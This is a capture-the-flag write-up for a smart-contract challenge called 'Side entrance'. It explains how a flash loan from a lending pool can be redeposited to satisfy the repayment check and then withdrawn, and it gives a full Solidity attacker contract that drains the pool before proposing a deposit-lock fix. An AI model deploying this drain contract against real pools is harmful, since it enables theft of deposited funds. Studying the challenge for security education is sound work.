# Side entrance

## Challenge

A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.

This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

You must take all ETH from the lending pool.

## Solution

We start analyzing the `flashLoan` function of the pool contract

```solidity
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;
    require(balanceBefore >= amount, "Not enough ETH in balance");

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");
}
```

We observe that this runs the `execute`function in the contract stored in the address `msg.sender`, and sends the borrowed amount with it. On the other hand, this pool offers two additional methods

```solidity
function deposit() external payable {
    balances[msg.sender] += msg.value;
}

function withdraw() external {
    uint256 amountToWithdraw = balances[msg.sender];
    balances[msg.sender] = 0;
    payable(msg.sender).sendValue(amountToWithdraw);
}
```

Notice that anyone that deposits value in this pool is able to retrieve it afterwards. An attacker can profit from this by using the borrowed money to deposit it in the pool. In this case, the total balance of the pool will not change and the flashloan will be finalized. However, when this is done, the attacker being the depositer now has the access to the funds via the withdraw function. And that is it. Let us now implement the attacker contract in [AttackerSideEntrance.sol]('./AttackerSideEntrance.sol')

```solidity
contract AttackerSideEntrance {

    fallback() external payable {}

    function attack(address _pool, uint256 amount) public {
        IPool(_pool).flashLoan(amount);
        IPool(_pool).withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        IPool(msg.sender).deposit{value: msg.value}();
    }
}
```

First we need to import the pool contract or simply create an interface of it. In this case we created an interface called `IPool`. Then we create an `execute` function that takes the value from the loan and deposits it back to the pool. In order to execute the loan, we create an `attack` function that calls the `flashLoan` in `SideEntranceLenderPool.sol`. Once the flashloan is executed we can call the `withdraw` function. In order to receive funds in this attacker contract we should make it `payable` by adding a payable `fallback` function. Once the balance is in this contract, we transfer it to `msg.sender` which is the account launching the attack.

## Solving the issue

One way to block this hack could be to desactivate the `deposit` function while running the `flashLoan`. This can be done by setting the value of a toggle global variable to `false` when initiating the flashloan and requiring this variable to be true when depositing. Once the flashloan is executed the toggle variable would recover its `true` value. In this way, we make sure that during the `flashLoan` transaction the balance of the contract cannot be modified using the `deposit` function. Even if it is still possible to modify the balance by using a `selfdestruct`, these funds cannot be recovered via the `withdraw` function.
